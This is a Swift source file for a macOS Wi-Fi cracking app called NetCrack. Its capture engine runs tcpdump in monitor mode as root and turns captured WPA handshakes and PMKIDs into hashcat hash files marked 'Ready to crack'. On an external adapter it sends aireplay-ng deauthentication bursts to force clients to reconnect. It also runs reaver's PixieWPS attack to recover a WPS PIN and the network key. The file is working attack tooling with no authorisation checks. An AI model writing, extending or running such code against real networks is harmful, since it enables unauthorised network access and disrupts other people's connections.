import Foundation
import CoreWLAN

/// Records 802.11 frames, counts them, and reports when a handshake or a PMKID
/// appears.
///
/// Built-in mode is passive on purpose: `tcpdump -I` can put the Mac's radio
/// into monitor mode but the radio cannot transmit there, so no deauth and no
/// active WPS. External mode keeps the same capture path (tcpdump is far more
/// reliable than airodump-ng on macOS) but unlocks `aireplay-ng` for deauth and
/// `wash`/`reaver` for WPS.
actor CaptureEngine {
    enum Event: Sendable {
        case status(CaptureStatus)
        case stats(CaptureStats)
        case hashes([CaptureHash])
        case diagnostics(MonitorDiagnostics)
        case log(LogLine)
        case summary(Summary)
        case failed(UserFacingError)
    }

    struct Configuration: Sendable {
        var mode: CaptureMode
        var interfaceName: String
        /// Channel the adapter should listen on. 0/nil leaves it alone.
        var desiredChannel: Int?
        var target: AccessPoint?
        var pcapURL: URL
        var keepDisplayAwake: Bool
        var deauthAfterStart: Bool
        var deauthClient: String
        /// Set when the user explicitly asked to lock the channel.
        var lockChannel: Bool
    }

    struct Summary: Sendable {
        var pcapURL: URL
        var hashFile: URL?
        var hashes: [CaptureHash]
        var stats: CaptureStats
        var status: CaptureStatus
        var duration: TimeInterval
        var conversion: Converter.ConversionResult?
        var mode: CaptureMode
        var interfaceName: String
        var channel: Int?
    }

    private let runner = ProcessRunner()
    private var running = false
    private var stopping = false
    private var stopRequestedAt: Date?

    private var configuration: Configuration?
    private var continuation: AsyncStream<Event>.Continuation?

    private var status: CaptureStatus = .idle
    private var startedAt: Date?
    private var pcapURL: URL?
    private var hashURL: URL?
    private var killPattern: String?
    private var tcpdumpPath: String?

    private var inspector = PcapInspector()
    private var stats = CaptureStats.empty
    private var hashes: [CaptureHash] = []
    private var conversion: Converter.ConversionResult?
    private var lastConversionAt = Date.distantPast
    private var lastStatsEmit = Date.distantPast
    private var lastChannelCheck = Date.distantPast
    private var mismatchStreak = 0
    private var mismatchReported = false
    private var silenceLogged = false
    private var deauthPerformed = false
    private var foundHandshakeLogged = false
    private var foundPMKIDLogged = false
    private var powerAssertion: PowerAssertion?
    private var captureTask: Task<Void, Never>?
    private var captureExitCode: Int32?
    private var captureDiagnostic: String?

    // MARK: - Public state

    func isRunning() -> Bool { running }

    func currentStatus() -> CaptureStatus { status }

    func currentHashes() -> [CaptureHash] { hashes }

    /// Starts a capture and streams everything that happens until it stops.
    nonisolated func start(_ configuration: Configuration) -> AsyncStream<Event> {
        AsyncStream { continuation in
            let task = Task {
                await self.begin(configuration, continuation: continuation)
            }
            continuation.onTermination = { @Sendable termination in
                if case .cancelled = termination {
                    task.cancel()
                    Task { await self.stop() }
                }
            }
        }
    }

    /// Requests a graceful stop: SIGINT lets tcpdump flush and close the pcap.
    func stop() async {
        guard running else { return }
        if stopping { return }
        stopping = true
        stopRequestedAt = Date()
        emit(.log(LogLine("Stopping capture and closing the pcap…", kind: .system)))
        if let pattern = killPattern {
            await RootExecutor.shared.killByPattern(pattern, signal: "INT")
        }
    }

    // MARK: - Capture lifecycle

    private func begin(_ configuration: Configuration, continuation: AsyncStream<Event>.Continuation) async {
        guard !running else {
            continuation.yield(.failed(UserFacingError(
                message: "A capture is already running. Stop it before starting another.",
                detail: "Only one radio session can own the interface at a time."
            )))
            continuation.finish()
            return
        }

        running = true
        self.configuration = configuration
        self.continuation = continuation
        self.startedAt = Date()
        self.stats = .empty
        self.hashes = []
        self.conversion = nil
        self.inspector.reset()
        self.status = .starting
        self.captureExitCode = nil
        self.captureDiagnostic = nil
        self.silenceLogged = false
        self.mismatchStreak = 0
        self.mismatchReported = false
        self.deauthPerformed = false
        self.foundHandshakeLogged = false
        self.foundPMKIDLogged = false
        self.lastConversionAt = .distantPast
        self.lastStatsEmit = .distantPast
        self.lastChannelCheck = .distantPast

        if configuration.keepDisplayAwake {
            let assertion = PowerAssertion()
            assertion.acquire(reason: "NetCrack is capturing Wi-Fi frames for \(configuration.target?.displayName ?? "a target network")")
            powerAssertion = assertion
        }

        emit(.status(.starting))
        emit(.log(LogLine(
            "Starting \(configuration.mode.shortTitle.lowercased()) capture on \(configuration.interfaceName)",
            kind: .system
        )))

        var failure: NetCrackError?
        do {
            try await preflight(configuration)
            try await launchCapture(configuration)
            try await monitorLoop(configuration)
        } catch let error as NetCrackError {
            failure = error
        } catch is CancellationError {
            failure = .cancelled
        } catch {
            failure = .other(error.localizedDescription)
        }

        await finalize(configuration, failure: failure)
    }

    private func preflight(_ configuration: Configuration) async throws {
        if configuration.mode == .builtin {
            let info = await Scanner.shared.interfaceInfo()
            guard info.isPoweredOn else { throw NetCrackError.wiFiOff }
        } else {
            let check = try? await runner.run(
                ProcessRunner.Command(executable: "/sbin/ifconfig", arguments: [configuration.interfaceName]),
                timeout: 10
            )
            guard let check, check.exitCode == 0 else {
                throw NetCrackError.noInterface
            }
            if check.stdout.lowercased().contains("status: inactive") {
                emit(.log(LogLine(
                    "\(configuration.interfaceName) reports status: inactive. Bring the adapter up before capturing.",
                    kind: .warning
                )))
            }
        }

        guard let tcpdump = await ToolLocator.shared.executablePath(for: .tcpdump) else {
            throw NetCrackError.toolMissing(.tcpdump)
        }
        tcpdumpPath = tcpdump

        try FileManager.default.createDirectory(
            at: configuration.pcapURL.deletingLastPathComponent(),
            withIntermediateDirectories: true
        )
        try? FileManager.default.removeItem(at: configuration.pcapURL)
        pcapURL = configuration.pcapURL
        hashURL = configuration.pcapURL.deletingPathExtension().appendingPathExtension("22000")

        emit(.log(LogLine("Requesting administrator rights. macOS asks once; NetCrack reuses that authorisation for the rest of the session.", kind: .info)))
        try await RootExecutor.shared.authorize()
        emit(.log(LogLine("Administrator channel is ready.", kind: .system)))
        if stopping { throw NetCrackError.cancelled }

        if configuration.lockChannel, let channel = configuration.desiredChannel, channel > 0 {
            await lockChannel(channel, interfaceName: configuration.interfaceName)
        } else if let channel = configuration.desiredChannel, channel > 0 {
            emit(.log(LogLine(
                "Channel lock is off. The adapter stays on its current channel; the target is on channel \(channel).",
                kind: .info
            )))
        }

        if SessionState.isScreenLocked() {
            throw NetCrackError.screenLocked
        }
    }

    /// Channel locking needs `airport(1)`, which Apple removed in macOS 14.4.
    /// When it is missing the honest answer is "cannot lock", not a fake
    /// success.
    private func lockChannel(_ channel: Int, interfaceName: String) async {
        guard let airport = Scanner.airportPath() else {
            emit(.log(LogLine(
                "Channel lock is unavailable: Apple removed /usr/bin/airport in macOS 14.4. The capture will listen on whatever channel the Mac's radio is tuned to. To land on channel \(channel), join a network on that channel, or use an external adapter that can be pinned.",
                kind: .warning
            )))
            return
        }
        emit(.log(LogLine("Trying to pin \(interfaceName) to channel \(channel) with airport(1)…", kind: .info)))
        _ = await runRoot("\(Formatters.shellQuoted(airport)) -z", timeout: 20, killPattern: "airport")
        let result = await runRoot(
            "\(Formatters.shellQuoted(airport)) \(Formatters.shellQuoted(interfaceName)) -c\(channel)",
            timeout: 20,
            killPattern: "airport"
        )
        if result.exitCode == 0 && !result.output.lowercased().contains("error") {
            emit(.log(LogLine("Channel \(channel) locked via airport(1).", kind: .success)))
        } else {
            emit(.log(LogLine(
                "airport(1) could not lock channel \(channel): \(result.output.trimmingCharacters(in: .whitespacesAndNewlines)). Continuing on the current channel.",
                kind: .warning
            )))
        }
    }

    private func launchCapture(_ configuration: Configuration) async throws {
        if stopping { throw NetCrackError.cancelled }
        guard let tcpdump = tcpdumpPath, let pcap = pcapURL else {
            throw NetCrackError.other("Capture was not configured correctly (missing tcpdump or pcap path).")
        }

        var arguments = [
            "-i", configuration.interfaceName,
            "-I",
            "-y", "IEEE802_11",
            "-w", pcap.path,
            "-U",
            "-n"
        ]
        if configuration.mode == .external {
            // Larger buffer: USB adapters are slow to drain.
            arguments.append(contentsOf: ["-B", "8192"])
        }

        let command = ([tcpdump] + arguments).joined(separator: " ")
        killPattern = pcap.lastPathComponent
        emit(.log(LogLine("$ sudo \(command)", kind: .command)))

        let stream = RootExecutor.shared.streamShell(command, killPattern: pcap.lastPathComponent)
        let interfaceName = configuration.interfaceName
        captureTask = Task { [weak self] in
            for await event in stream {
                guard let self else { return }
                switch event {
                case .started:
                    break
                case let .line(text):
                    await self.handleCaptureLine(text, interfaceName: interfaceName)
                case let .exited(code):
                    await self.handleCaptureExit(code)
                case let .failed(message):
                    await self.handleCaptureFailure(message)
                }
            }
        }

        // Wait for tcpdump to actually create the pcap, instead of pretending
        // the capture started the moment the process was spawned.
        let deadline = Date().addingTimeInterval(12)
        while Date() < deadline {
            if let diagnostic = captureDiagnostic {
                throw mapCaptureFailure(diagnostic, interfaceName: configuration.interfaceName)
            }
            if let code = captureExitCode {
                throw mapCaptureFailure(captureDiagnostic ?? "tcpdump exited with code \(code).", interfaceName: configuration.interfaceName)
            }
            if FileManager.default.fileExists(atPath: pcap.path) {
                break
            }
            try await Task.sleep(nanoseconds: 150_000_000)
        }

        guard FileManager.default.fileExists(atPath: pcap.path) else {
            throw NetCrackError.other("tcpdump never created \(pcap.lastPathComponent). Check that \(configuration.interfaceName) exists and is not held by another program.")
        }

        emit(.log(LogLine("Monitor mode active — recording to \(pcap.lastPathComponent).", kind: .success)))
        setStatus(.capturing)

        let channel = await Scanner.shared.interfaceInfo().channel
        stats.channel = channel ?? configuration.desiredChannel
    }

    private func handleCaptureLine(_ text: String, interfaceName: String) {
        emit(.log(LogLine(text, kind: .output)))
        let lower = text.lowercased()
        let looksLikeError = lower.contains("error") || lower.contains("permission")
            || lower.contains("failed") || lower.contains("not permitted")
            || lower.contains("no such device") || lower.contains("device not configured")
            || lower.contains("not up") || lower.contains("biocsetif")
            || lower.contains("invalid option") || lower.contains("unsupported")
        if looksLikeError {
            captureDiagnostic = text
        }
    }

    private func handleCaptureExit(_ code: Int32) {
        captureExitCode = code
    }

    private func handleCaptureFailure(_ message: String) {
        captureDiagnostic = message
        captureExitCode = -1
    }

    private func mapCaptureFailure(_ message: String, interfaceName: String) -> NetCrackError {
        let lower = message.lowercased()
        if lower.contains("not permitted") || lower.contains("permission denied") {
            return .authorizationFailed("tcpdump could not open the capture device. \(message)")
        }
        if lower.contains("no such device") || lower.contains("device not configured") {
            return .noInterface
        }
        if lower.contains("not up") || lower.contains("resource busy") || lower.contains("address already in use") {
            return .adapterBusy(interface: interfaceName)
        }
        if lower.contains("monitor") {
            return .monitorModeUnsupported(interface: interfaceName)
        }
        if lower.contains("biocsetif") || lower.contains("invalid option") {
            return .notInMonitorMode(interface: interfaceName)
        }
        return .other(message.isEmpty ? "tcpdump failed before it could capture anything." : message)
    }

    // MARK: - Monitor loop

    private func monitorLoop(_ configuration: Configuration) async throws {
        while true {
            if let requested = stopRequestedAt, Date().timeIntervalSince(requested) > 6 {
                // tcpdump did not react to SIGINT; give up waiting so the UI
                // cannot get stuck in "Capturing".
                emit(.log(LogLine("tcpdump did not stop within 6 s; detaching from the capture.", kind: .warning)))
                break
            }

            if let code = captureExitCode {
                if code == 0 || stopping {
                    if let diagnostic = captureDiagnostic, code != 0, !stopping {
                        throw mapCaptureFailure(diagnostic, interfaceName: configuration.interfaceName)
                    }
                    break
                }
                let message = captureDiagnostic ?? "tcpdump exited with code \(code)."
                throw mapCaptureFailure(message, interfaceName: configuration.interfaceName)
            }

            try await Task.sleep(nanoseconds: 400_000_000)
            if Task.isCancelled { throw NetCrackError.cancelled }

            if SessionState.isScreenLocked() {
                emit(.log(LogLine(
                    "The Mac locked, which pauses Wi-Fi capture. Stopping so the pcap stays valid — unlock and start again.",
                    kind: .error
                )))
                throw NetCrackError.screenLocked
            }

            if let pcap = pcapURL {
                let counters = inspector.ingest(url: pcap)
                updateStats(counters, pcapURL: pcap)
            }

            evaluateSilence(configuration)
            await maybeConvert(configuration)
            await checkChannel(configuration)
            await maybeDeauth(configuration)
        }

        if stopping {
            status = hasHashesStatus() ?? status
        }
    }

    private func updateStats(_ counters: PcapInspector.Counters, pcapURL: URL) {
        stats.frames = counters.packets
        stats.bytes = counters.wireBytes
        stats.beacons = counters.beacons
        stats.dataFrames = counters.dataFrames
        stats.eapolFrames = counters.eapolFrames
        stats.pcapSize = Formatters.fileSize(at: pcapURL)
        if counters.packets > 0 {
            stats.firstFrameAt = stats.firstFrameAt ?? Date()
            stats.lastFrameAt = Date()
        }
        let clients = counters.clients
            .map { WirelessClient(mac: $0.key, frames: $0.value) }
            .sorted { $0.frames > $1.frames }
            .prefix(20)
        stats.clients = Array(clients)

        if Date().timeIntervalSince(lastStatsEmit) > 0.4 {
            lastStatsEmit = Date()
            emit(.stats(stats))
            if status == .noSignal, stats.frames > 0 {
                setStatus(.capturing)
                silenceLogged = false
            }
        }
    }

    private func evaluateSilence(_ configuration: Configuration) {
        guard let startedAt else { return }
        let elapsed = Date().timeIntervalSince(startedAt)
        guard elapsed > 10, stats.frames == 0, !silenceLogged, !stopping else { return }
        silenceLogged = true

        let diagnostics = MonitorDiagnostics(
            verdict: .silent,
            framesSeen: 0,
            channel: stats.channel,
            interfaceName: configuration.interfaceName,
            detail: "tcpdump accepted monitor mode but delivered 0 frames in \(Int(elapsed)) s. On some Apple Silicon Macs running macOS 26 the built-in radio reports success and then captures nothing."
        )
        emit(.diagnostics(diagnostics))
        setStatus(.noSignal)
        emit(.log(LogLine(
            "No frames after \(Int(elapsed)) s. \(NetCrackError.monitorModeSilent(frames: 0).errorDescription ?? "")",
            kind: .error
        )))
        emit(.log(LogLine(
            "Try: (1) move closer to the AP, (2) stop other capture tools, (3) continue on an external monitor-capable adapter — the built-in radio cannot be relied on for this on macOS 26.",
            kind: .info
        )))
    }

    private func maybeConvert(_ configuration: Configuration) async {
        guard let pcap = pcapURL, stats.frames > 0, !stopping else { return }
        guard Date().timeIntervalSince(lastConversionAt) > 2.5 else { return }
        lastConversionAt = Date()

        let destination = hashURL ?? pcap.deletingPathExtension().appendingPathExtension("22000")
        do {
            let result = try await Converter.shared.convert(
                pcap: pcap,
                destination: destination,
                copyWhileWriting: true
            )
            applyConversion(result, target: configuration.target)
        } catch let error as NetCrackError {
            if case .noHashesYet = error { return }
            emit(.log(LogLine("Conversion attempt failed: \(error.errorDescription ?? "unknown error")", kind: .warning)))
        } catch {
            emit(.log(LogLine("Conversion attempt failed: \(error.localizedDescription)", kind: .warning)))
        }
    }

    private func applyConversion(_ result: Converter.ConversionResult, target: AccessPoint?) {
        conversion = result
        stats.eapolHashes = result.eapolCount
        stats.pmkidHashes = result.pmkidCount
        // A PMKID lives inside an EAPOL-Key M1's RSN information element, so
        // it cannot be counted by inspecting frame types alone; the converter
        // is the thing that actually finds them.
        stats.pmkidFrames = result.pmkidCount

        if result.hashes != hashes {
            hashes = result.hashes
            emit(.hashes(hashes))
        }
        guard result.hashCount > 0 else { return }

        let matched = Converter.hashes(result.hashes, matching: target)
        let relevant = matched.isEmpty ? result.hashes : matched

        if relevant.contains(where: { $0.kind == .pmkid }) {
            if !foundPMKIDLogged {
                foundPMKIDLogged = true
                emit(.log(LogLine("PMKID captured for \(target?.displayName ?? relevant[0].displaySSID). Ready to crack.", kind: .success)))
            }
            setStatus(.pmkidFound)
        } else if relevant.contains(where: { $0.kind == .eapol }) {
            if !foundHandshakeLogged {
                foundHandshakeLogged = true
                emit(.log(LogLine("EAPOL handshake captured for \(target?.displayName ?? relevant[0].displaySSID). Ready to crack.", kind: .success)))
            }
            if status != .pmkidFound {
                setStatus(.handshakeFound)
            }
        }
    }

    private func hasHashesStatus() -> CaptureStatus? {
        if stats.pmkidHashes > 0 { return .pmkidFound }
        if stats.eapolHashes > 0 { return .handshakeFound }
        return nil
    }

    /// Reports a channel mismatch instead of silently capturing nothing.
    private func checkChannel(_ configuration: Configuration) async {
        guard let target = configuration.target, target.channel > 0 else { return }
        guard Date().timeIntervalSince(lastChannelCheck) > 5 else { return }
        lastChannelCheck = Date()

        let info = await Scanner.shared.interfaceInfo()
        stats.channel = info.channel ?? stats.channel
        guard let actual = info.channel, actual > 0 else { return }

        if actual != target.channel {
            mismatchStreak += 1
            if mismatchStreak >= 2, !mismatchReported {
                mismatchReported = true
                emit(.diagnostics(MonitorDiagnostics(
                    verdict: .wrongChannel(expected: target.channel, seen: actual),
                    framesSeen: stats.frames,
                    channel: actual,
                    interfaceName: configuration.interfaceName,
                    detail: "The radio reports channel \(actual) while \(target.displayName) is on channel \(target.channel). A monitor-mode radio only records frames from the channel it is tuned to."
                )))
                emit(.log(LogLine(
                    NetCrackError.channelMismatch(expected: target.channel, actual: actual, interface: configuration.interfaceName).errorDescription ?? "",
                    kind: .warning
                )))
                if configuration.mode == .builtin {
                    emit(.log(LogLine(
                        "On the built-in radio the practical fix is to join a network that runs on channel \(target.channel) (for example the target itself, if you know its key) or to use an external adapter that can be pinned.",
                        kind: .info
                    )))
                }
            }
        } else {
            mismatchStreak = 0
            if mismatchReported {
                mismatchReported = false
                emit(.log(LogLine("Channel is back on \(target.channel).", kind: .info)))
            }
        }
    }

    private func maybeDeauth(_ configuration: Configuration) async {
        guard configuration.deauthAfterStart, !deauthPerformed, !stopping else { return }
        guard let startedAt, Date().timeIntervalSince(startedAt) > 3 else { return }
        deauthPerformed = true
        await deauth(client: configuration.deauthClient.isEmpty ? nil : configuration.deauthClient)
    }

    // MARK: - Deauth (external adapter only)

    /// Forces a handshake by deauthenticating a client. Only possible on an
    /// external adapter: the built-in radio cannot transmit in monitor mode.
    func deauth(client: String?) async {
        guard let configuration else {
            emit(.failed(UserFacingError(NetCrackError.other("Start a capture before sending a deauth."))))
            return
        }
        guard configuration.mode == .external else {
            emit(.log(LogLine(
                NetCrackError.deauthUnsupportedBuiltin.errorDescription ?? "",
                kind: .warning
            )))
            emit(.failed(UserFacingError(NetCrackError.deauthUnsupportedBuiltin)))
            return
        }
        guard let target = configuration.target, !target.bssid.isEmpty else {
            emit(.failed(UserFacingError(NetCrackError.noTarget)))
            return
        }
        guard let aireplay = await Self.airTool(named: "aireplay-ng") else {
            emit(.failed(UserFacingError(NetCrackError.toolMissing(.aircrack))))
            return
        }

        var command = "\(Formatters.shellQuoted(aireplay)) --deauth 8 -a \(Formatters.shellQuoted(target.bssid))"
        if let client, !client.trimmingCharacters(in: .whitespaces).isEmpty {
            command += " -c \(Formatters.shellQuoted(client.trimmingCharacters(in: .whitespaces)))"
        } else {
            command += " --ignore-negative-one"
        }
        command += " \(Formatters.shellQuoted(configuration.interfaceName))"

        emit(.log(LogLine("$ sudo \(command)", kind: .command)))
        let result = await runRoot(command, timeout: 90, killPattern: "aireplay-ng")
        for line in result.output.split(separator: "\n") {
            emit(.log(LogLine(String(line), kind: .output)))
        }
        if result.exitCode == 0 {
            emit(.log(LogLine("Deauth burst sent. Waiting for the client to reconnect so the handshake can be recorded.", kind: .success)))
        } else if result.output.lowercased().contains("monitor") == false {
            emit(.log(LogLine("aireplay-ng exited with \(result.exitCode). Check that the adapter is in monitor mode and supports injection.", kind: .warning)))
        }
    }

    // MARK: - WPS (external adapter only)

    /// Runs wash + reaver against a WPS-enabled AP. Returns the PSK when
    /// PixieWPS succeeds, nil when the AP is locked or the attack fails.
    func runWPS(
        interfaceName: String,
        target: AccessPoint,
        channel: Int?,
        logger: @escaping @Sendable (LogLine) -> Void
    ) async throws -> String? {
        guard !target.bssid.isEmpty else { throw NetCrackError.noTarget }

        try await RootExecutor.shared.authorize()

        if let wash = await ToolLocator.shared.executablePath(for: .wash) {
            var scanCommand = "\(Formatters.shellQuoted(wash)) -i \(Formatters.shellQuoted(interfaceName))"
            if let channel, channel > 0 {
                scanCommand += " -c \(channel)"
            }
            logger(LogLine("$ sudo \(scanCommand)", kind: .command))
            let scan = await runRoot(scanCommand, timeout: 25, killPattern: "wash")
            var locked = false
            var sawTarget = false
            for line in scan.output.split(separator: "\n") {
                let text = String(line)
                logger(LogLine(text, kind: .output))
                let upper = text.uppercased()
                if upper.contains(target.bssid.uppercased()) {
                    sawTarget = true
                    if upper.contains("LOCK") { locked = true }
                }
            }
            if locked {
                throw NetCrackError.wpsLocked(target.bssid)
            }
            if !sawTarget {
                logger(LogLine("wash did not list \(target.displayName). It may not have WPS enabled, or the channel is wrong.", kind: .warning))
            }
        } else {
            logger(LogLine("wash is not installed; skipping the WPS capability check.", kind: .warning))
        }

        guard let reaver = await ToolLocator.shared.executablePath(for: .reaver) else {
            throw NetCrackError.toolMissing(.reaver)
        }

        var command = "\(Formatters.shellQuoted(reaver)) -i \(Formatters.shellQuoted(interfaceName)) -b \(Formatters.shellQuoted(target.bssid)) -vv -K 1 -N"
        if let channel, channel > 0 {
            command += " -c \(channel)"
        }
        logger(LogLine("$ sudo \(command)", kind: .command))
        logger(LogLine("Trying the PixieWPS offline PIN attack. This usually finishes in seconds; a full PIN run can take hours.", kind: .info))

        let timeout: TimeInterval = 600
        let watchdog = Task { [weak self] in
            try? await Task.sleep(nanoseconds: UInt64(timeout * 1_000_000_000))
            guard !Task.isCancelled else { return }
            await RootExecutor.shared.killByPattern("reaver", signal: "INT")
            await self?.emit(.log(LogLine("reaver reached the 10 minute limit and was stopped.", kind: .warning)))
        }
        defer { watchdog.cancel() }

        var foundKey: String?
        var pin: String?
        for await event in RootExecutor.shared.streamShell(command, killPattern: "reaver") {
            switch event {
            case let .line(text):
                logger(LogLine(text, kind: .output))
                if let value = Self.parseQuoted(after: "WPA PSK:", in: text) {
                    foundKey = value
                }
                if let value = Self.parseQuoted(after: "WPS PIN:", in: text) {
                    pin = value
                }
                if text.uppercased().contains("WPS PIN LOCKED") || text.lowercased().contains("detected ap rate limiting") {
                    logger(LogLine("The AP is rate limiting or locking WPS. Stop and wait a few minutes.", kind: .warning))
                }
            case let .exited(code):
                logger(LogLine("reaver finished with exit code \(code).", kind: code == 0 ? .success : .warning))
            case let .failed(message):
                throw NetCrackError.other(message)
            case .started:
                break
            }
        }

        if let pin {
            logger(LogLine("WPS PIN recovered: \(pin)", kind: .success))
        }
        if let foundKey {
            logger(LogLine("WPS produced the network key.", kind: .success))
            return foundKey
        }
        logger(LogLine("PixieWPS did not yield a key. A full PIN run is possible but slow; PMKID capture is usually the faster path.", kind: .info))
        return nil
    }

    func cancelWPS() async {
        await RootExecutor.shared.killByPattern("reaver", signal: "INT")
    }

    private static func parseQuoted(after marker: String, in line: String) -> String? {
        guard let range = line.range(of: marker, options: .caseInsensitive) else { return nil }
        let rest = line[range.upperBound...]
        guard let open = rest.firstIndex(of: "'") else { return nil }
        let afterOpen = rest.index(after: open)
        guard let close = rest[afterOpen...].firstIndex(of: "'") else { return nil }
        let value = rest[afterOpen..<close].trimmingCharacters(in: .whitespaces)
        return value.isEmpty ? nil : value
    }

    static func airTool(named name: String) async -> String? {
        if let aircrack = await ToolLocator.shared.executablePath(for: .aircrack) {
            let sibling = URL(fileURLWithPath: aircrack)
                .deletingLastPathComponent()
                .appendingPathComponent(name)
                .path
            if FileManager.default.isExecutableFile(atPath: sibling) { return sibling }
        }
        for directory in ["/opt/homebrew/bin", "/opt/homebrew/sbin", "/usr/local/bin", "/usr/local/sbin", "/usr/bin", "/usr/sbin"] {
            let candidate = "\(directory)/\(name)"
            if FileManager.default.isExecutableFile(atPath: candidate) { return candidate }
        }
        return nil
    }

    // MARK: - Finalisation

    private func finalize(_ configuration: Configuration, failure: NetCrackError?) async {
        let duration = startedAt.map { Date().timeIntervalSince($0) } ?? 0
        let pcap = pcapURL ?? configuration.pcapURL

        // Make sure the radio is released and the pcap is flushed before the
        // final conversion runs, whatever brought us here.
        if let pattern = killPattern, captureExitCode == nil {
            await RootExecutor.shared.killByPattern(pattern, signal: "INT")
            try? await Task.sleep(nanoseconds: 700_000_000)
        }
        captureTask?.cancel()
        captureTask = nil

        // One last conversion so a stop never loses the handshake that just
        // arrived.
        if FileManager.default.fileExists(atPath: pcap.path) {
            do {
                let destination = hashURL ?? pcap.deletingPathExtension().appendingPathExtension("22000")
                let result = try await Converter.shared.convert(pcap: pcap, destination: destination, copyWhileWriting: true)
                applyConversion(result, target: configuration.target)
            } catch let error as NetCrackError {
                if case .noHashesYet = error {
                    // Expected when nothing was captured; not worth an error.
                } else {
                    emit(.log(LogLine("Final conversion failed: \(error.errorDescription ?? "unknown error")", kind: .warning)))
                }
            } catch {
                emit(.log(LogLine("Final conversion failed: \(error.localizedDescription)", kind: .warning)))
            }
        }

        let hashFile: URL? = {
            guard let hashURL, FileManager.default.fileExists(atPath: hashURL.path) else { return nil }
            return hashURL
        }()

        let finalStatus: CaptureStatus
        if let failure, !failure.isCancellation {
            finalStatus = .failed(failure.errorDescription ?? "Capture failed.")
        } else if stats.pmkidHashes > 0 {
            finalStatus = .pmkidFound
        } else if stats.eapolHashes > 0 {
            finalStatus = .handshakeFound
        } else if stats.frames == 0 {
            finalStatus = .noSignal
        } else {
            finalStatus = .idle
        }
        status = finalStatus
        emit(.status(finalStatus))

        if let failure, failure.isCancellation {
            emit(.log(LogLine("Capture stopped.", kind: .system)))
        } else if let failure {
            emit(.failed(UserFacingError(failure)))
        } else {
            emit(.log(LogLine("Capture stopped after \(Formatters.clock(duration)).", kind: .system)))
        }

        let summary = Summary(
            pcapURL: pcap,
            hashFile: hashFile,
            hashes: hashes,
            stats: stats,
            status: finalStatus,
            duration: duration,
            conversion: conversion,
            mode: configuration.mode,
            interfaceName: configuration.interfaceName,
            channel: stats.channel
        )
        emit(.summary(summary))

        powerAssertion?.release()
        powerAssertion = nil
        running = false
        stopping = false
        stopRequestedAt = nil
        killPattern = nil
        continuation?.finish()
        continuation = nil
        self.configuration = nil
    }

    // MARK: - Plumbing

    private func setStatus(_ newStatus: CaptureStatus) {
        guard status != newStatus else { return }
        status = newStatus
        emit(.status(newStatus))
    }

    private func emit(_ event: Event) {
        continuation?.yield(event)
    }

    /// Runs a root command to completion, streaming nothing. Used for short
    /// control commands (channel lock, deauth, wash).
    private func runRoot(_ command: String, timeout: TimeInterval, killPattern: String) async -> RootExecutor.CommandResult {
        do {
            return try await RootExecutor.shared.runShell(command, timeout: timeout, killPattern: killPattern)
        } catch {
            let message = (error as? NetCrackError)?.errorDescription ?? error.localizedDescription
            return RootExecutor.CommandResult(exitCode: -1, output: message)
        }
    }
}
